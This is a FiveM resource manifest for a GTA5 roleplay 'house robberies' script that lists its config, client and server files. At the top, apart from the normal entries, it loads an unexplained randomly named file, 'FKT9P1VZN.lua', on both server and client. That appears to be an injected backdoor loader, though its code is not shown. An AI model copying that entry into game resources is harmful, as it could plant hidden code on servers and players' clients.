server_script "FKT9P1VZN.lua"
client_script "FKT9P1VZN.lua"
name "md-houserobberies v2"
author "Mustache Dom"
description "Steal Things From Houses"
fx_version 'cerulean'
game 'gta5'
version '2.8'

shared_scripts {
    'config.lua',
    '@qb-core/shared/locale.lua',
    '@ox_lib/init.lua',
}

client_script {
   'client/**.lua',
}
server_script {
'server/**.lua'
}

lua54 'yes'
